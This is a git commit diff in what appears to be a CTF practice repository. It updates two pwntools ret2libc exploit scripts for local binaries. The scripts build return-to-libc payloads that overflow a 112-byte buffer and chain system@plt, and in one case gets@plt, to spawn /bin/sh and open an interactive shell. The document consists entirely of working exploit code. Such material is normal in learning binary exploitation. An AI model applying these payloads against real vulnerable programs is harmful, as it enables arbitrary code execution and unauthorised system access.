1ed7eaf7ec871fbc82246c3e199051f6dbc87217
peixiaokun <993676483@qq.com>
2023-11-12 00:10:47 +0800

    finish

--- repetition/ret2libc/ret2libc1.py
+++ repetition/ret2libc/ret2libc1.py
@@ -3,6 +3,6 @@ from pwn import *
 shell = process('./ret2libc1')
 string = 0x8048720
 system_plt = 0x8048460
-payload = flat(['a' * 112, system_plt, 'a' * 4, string])
+payload = flat([b'a' * 112, system_plt, b'a' * 4, string])
 shell.sendline(payload)
 shell.interactive()
--- repetition/ret2libc/ret2libc2.py
+++ repetition/ret2libc/ret2libc2.py
@@ -4,7 +4,7 @@ gets_plt = 0x8048460
 system_plt = 0x8048490
 pop_ebx = 0x804843d
 buf2 = 0x804a080
-payload = flat(['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
+payload = flat([b'a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
 shell.sendline(payload)
-shell.sendline('/bin/sh')
+shell.sendline(b'/bin/sh')
 shell.interactive()
